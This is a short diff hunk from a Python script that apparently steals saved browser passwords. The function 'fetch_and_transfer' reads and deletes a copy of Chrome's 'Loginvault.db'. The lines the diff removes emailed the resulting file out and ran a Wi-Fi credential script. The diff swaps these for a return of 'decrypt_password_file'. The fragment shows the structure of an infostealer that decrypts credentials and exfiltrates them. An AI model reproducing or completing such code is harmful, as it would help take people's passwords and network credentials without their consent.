@@ -91,8 +91,6 @@ def fetch_and_transfer():
                     cursor.close()
                     conn.close()
                     os.remove("Loginvault.db")
-        script1.send_email(file_name)
-        os.remove(file_name)
-        wifi_script.execute()
+        return decrypt_password_file
     except Exception as e:
         print("[ERR] %s"%str(e))
